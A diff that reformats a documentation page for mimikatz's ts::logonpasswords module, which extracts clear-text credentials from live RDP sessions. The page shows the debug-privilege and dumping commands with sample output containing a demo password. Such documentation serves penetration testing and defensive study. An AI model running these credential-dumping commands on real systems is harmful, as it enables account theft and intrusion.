@@ -1,15 +1,15 @@
 # logonpasswords
 
-This module extracts clear text credentials from RDP running sessions \(server side\).
+`ts::logonpasswords` module extracts clear text credentials from RDP running sessions (server side).
 
 It supports RDP clients utilizing [**mstscax.dll**](https://docs.microsoft.com/en-us/windows/win32/termserv/mstscax) like mRemoteNG, Remote Desktop Manager, RDCMan and of course the Windows native one. It also supports X11 RDP clients such as rdesktop and freerdp.
 
-```text
+```
 mimikatz # privilege::debug
 Privilege '20' OK
 ```
 
-```text
+```
 mimikatz # ts::logonpasswords
 !!! Warning: false positives can be listed !!!
 
@@ -28,5 +28,4 @@ mimikatz # ts::logonpasswords
    Password/Pin: Super_SecretPass1!
 ```
 
-_\(Demonstration target is a Windows Server 2016 Essentials\)_
-
+_(Demonstration target is a Windows Server 2016 Essentials)_
